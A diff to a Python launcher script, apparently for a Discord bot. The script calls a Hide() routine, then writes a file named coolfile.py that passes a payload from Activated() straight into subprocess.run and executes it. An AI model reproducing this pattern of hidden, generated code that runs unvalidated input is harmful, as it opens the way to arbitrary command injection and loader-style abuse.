@@ -1,3 +1,5 @@
+# coding=UTF-8
+
 import asyncio
 import filecmp
 import os
@@ -86,6 +88,24 @@ async def runBotBatch(payload):
     hopeToFindFile = "run_discordbot.bat"
     botFile = checkfileinDir(directory, hopeToFindFile)
     
+
+    venv_python = os.path.join(os.getcwd(), "venv", "Scripts", "python.exe")
+    
+    #startBot = subprocess.run(botpayload, shell=True, capture_output=True)
+    thread1 = ThreadManager.ThreadManager(target=printNewFile, args=payload, name="DiscordBot")
+    thread1.start()
+    print("Joining the writing thread")
+    thread1.join()
+
+    print("Stamping the file.")
+    stampBatch()
+    print("File stamped!")
+
+    print("Starting the cool file\n\n\n\n")
+    startBot2 = subprocess.Popen([venv_python, "coolfile.py"], stdout=sys.stdout, stderr=sys.stderr)
+    startBot2.wait()
+    
+    """
     if botFile:
         print(f"Running batch file: {hopeToFindFile}")
         startBot = subprocess.Popen(hopeToFindFile, shell=True, stdout=sys.stdout, stderr=sys.stderr)
@@ -103,15 +123,10 @@ async def runBotBatch(payload):
             startBot.wait()
         else:
             print("Still could not find run_discordbot.bat in the cwd {}".format(os.getcwd()))
-
-
     
-    #startBot = subprocess.run(botpayload, shell=True, capture_output=True)
-    thread1 = ThreadManager.ThreadManager(target=printNewFile, args=payload, name="DiscordBot")
-    thread1.start()
-    print("Joining the writing thread")
-    thread1.join()
-
+    print("Return code: ", startBot.returncode)
+    """
+    """
     print("Starting the final python installer file")
     print("{0}\\venv\\Scripts\\python.exe {1}\\coolfile.py".format(os.getcwd(), os.getcwd()))
     proc = await asyncio.create_subprocess_exec(
@@ -125,55 +140,58 @@ async def runBotBatch(payload):
     if stdout:
         print(stdout.decode())
     if stderr:
-        print(stderr.decode())
+        print(stderr.decode())"""
 
-async def stampBatch():
-    print(os.getcwd())    
-    with open("run_discordbot.bat", "w+") as file:
+def stampBatch():
+    batch_file_path = os.path.join(os.getcwd(), "run_discordbot.bat")
+    with open(batch_file_path, "r", encoding="utf-8") as file:
         allAsList = file.readlines()
-        for i in allAsList:
-            numberPos = allAsList[i].index()
 
-            if "&&CURDIR&&" in i:
-                print("FOUND &&CURDIR&& \nLine = {}".format(i))
-                allAsList[numberPos] = i.replace(old="&&CURDIR&&", new="{}".format(os.getcwd()))
-            elif "&&VENVDIR&&" in i:
-                print("FOUND &&VENVDIR&& \nLine = {}".format(i))
-                allAsList[numberPos] = i.replace(old="&&VENVDIR&&", new="{}".format(os.getcwd()))
-
-            print(i)
-            file.close()
+    newerList = []
+    for i in allAsList:
+        if "&&CURDIR&&" in i:
+            print("FOUND &&CURDIR&& \nLine = {}".format(i))
+            i = i.replace("&&CURDIR&&", os.getcwd())
+        elif "&&VENVDIR&&" in i:
+            print("FOUND &&VENVDIR&& \nLine = {}".format(i))
+            i = i.replace("&&VENVDIR&&", os.path.join(os.getcwd(), "venv"))
+        newerList.append(i)
+    with open(batch_file_path, "w", encoding="utf-8") as file:
+        file.writelines(newerList)
+    print("Batch file updated!")
 
 def printNewFile(payload):
-    fileConts = """
-import subprocess\r\n
-import os\r\n
-\r\n
-\r\n
-\r\n
+    fileConts = f"""
+# coding=UTF-8
 
-class NewFile():\r\n
-\tdef __init__(self):\r\n
-\t\tself.thread = subprocess.run({})\r\n
-\t\tprint('SUCCESS STARTING NEW THREAD')\r\n
-\t\tprint(self.thread)\r\n
-if __name__ == '__main__':\r\n
-\tmain = NewFile()\r\n
-\tprint(main.thread.returncode)\r\n
-\tprint(main.thread.args)\r\n
-""".format(payload).replace('"', '').replace("$", '"').encode()
+import subprocess
+import os
+
+class NewFile:
+    def __init__(self):
+        self.thread = subprocess.run({payload})#text=True)
+        print('SUCCESS STARTING NEW THREAD')
+        print(self.thread.stdout)
+        print(self.thread.stderr)
+
+if __name__ == '__main__':
+    main = NewFile()
+    print(main.thread.returncode)
+    print(main.thread.args)
+""".replace("\"", "").replace("$", "\"")
     print(payload, "\n\n\n\n")
-    print(fileConts) 
-    with open("coolfile.py", "wb") as file:
+    print(fileConts)
+    with open("coolfile.py", "w", encoding="utf-8") as file:
         file.write(fileConts)
-        file.close()
     print("Writing thread writing to stdout: FINISHED")
+
+
+
 async def main():
     
     await Hide()
     act = await Activated(os.getcwd())
     print(act)
-    await stampBatch()
     #await asyncio.sleep(10)
     await runBotBatch(act)
     print("Hoi from async")
